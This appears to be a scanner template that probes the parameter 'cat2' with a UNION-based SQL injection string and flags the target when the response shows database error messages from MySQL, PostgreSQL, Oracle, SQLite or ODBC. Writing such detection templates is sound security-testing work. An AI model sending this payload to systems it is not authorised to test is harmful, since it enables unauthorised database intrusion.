id: sqli7-217
name: 'UNION probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - '1'' UNION SELECT ''a'',''b''--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
